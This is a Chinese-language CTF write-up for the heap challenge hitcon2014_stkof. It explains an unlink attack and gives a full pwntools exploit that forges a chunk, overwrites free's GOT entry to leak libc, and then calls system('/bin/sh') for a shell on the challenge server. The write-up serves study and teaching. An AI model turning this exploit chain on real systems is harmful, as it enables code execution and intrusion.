# hitcon2014_stkof

[题目地址](https://buuoj.cn/challenges#hitcon2014_stkof)

unlink对于像我一样的小白的难点不在于理解攻击本身，而是懒得算以及不知道怎么算该怎么申请堆块。至少我现在看[wp](https://blog.csdn.net/weixin_45677731/article/details/107747124)可以一边困着睡觉一边理解了（？）

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

堆题重要的只有开没开全RELRO和有没有pie，canary和nx看都不看一眼。没开全relro能搞got，没pie读地址简单。这题是个创新菜单类堆题，因为它压根没给你菜单，只能自己读这几个函数推断是干啥的。

```c
```

allocate分配堆块，没有什么特殊的结构，heap数组单纯存申请的各个堆块的地址，外加另外一个index变量记录索引。

```c
```

edit标准堆溢出。

```c
```

free没有啥问题。

```c
```

剩下一个没改名的函数啥用没有，也没看出来是干啥的。这题堆溢出随便使用，掏出unlink，因为heap数组结构简单，在unlink攻击时比较容易预测和控制。没啥别的说了，直接看exp吧。

```python
from pwn import *
sh=remote("node4.buuoj.cn",25390)
#sh=process("./stkof")
context.log_level='debug'
puts_plt=0x00400760
puts_got=0x00602020
free= 0x00602018
ptr=0x602150
def alloc(size):
    sh.sendline('1')
    sh.sendline(str(size))
    sh.recvuntil('OK\n')

def edit(idx, size, content):
    sh.sendline('2')
    sh.sendline(str(idx))
    sh.sendline(str(size))
    sh.send(content)
    sh.recvuntil('OK\n')

def delete(idx):
    sh.sendline('3')
    sh.sendline(str(idx))
    

alloc(0x30) #这个堆块拿来占位的，注意它的索引是1，因为allocate里面是++index，先自增再放入heap数组，导致heap[0]永远是空的
alloc(0x20)
alloc(0x80) 

payload=p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10) #在2号堆块内部构造一个假堆块。payload代表了假堆块的prev_size+size+fd+bk。fd和bk的值是公式，永远都是ptr-0x18和ptr-0x10。ptr是当前假堆块所在堆块在heap数组里的地址，此处是2号堆块。由于没有pie让这一步简单很多
payload+=p64(0x20)+p64(0x90) #这部分溢出到下一个堆块也就是3号堆块。分别为prev_size+size。因为我们想前一个伪造堆块是空闲的，所以prev_size填伪造堆块的大小
edit(2,len(payload),payload)

delete(3) #unlink执行，让ptr处装着ptr-0x18,即0x602138
sh.recvuntil('OK')

payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(puts_got) #第一个p64(0)填充，第二个p64(0)到原heap数组的地方，p64(free)是heap[1],p64(ptr-0x18)是heap[2],p64(puts_got)是heap[3]
edit(2,len(payload),payload) #编辑2号堆块就是在编辑ptr指向的0x602138。这里是heap数组-8的地方，也是为什么payload前面有个p64(0)
edit(1,8,p64(puts_plt)) #heap[1]是free的got地址，将free改为puts
delete(3) #那么delete时就会泄露出puts_got


base = u64(sh.recv(6).ljust(8,b'\x00'))-456336
sh.recvuntil('OK')
system_addr=base+283536


payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(ptr+0x10)+b"/bin/sh" #如法炮制，p64(ptr+0x10)是指向后面b"/bin/sh"的指针，这个计算就好了
edit(2,len(payload),payload)
edit(1,8,p64(system_addr))
delete(3)
sh.interactive()
```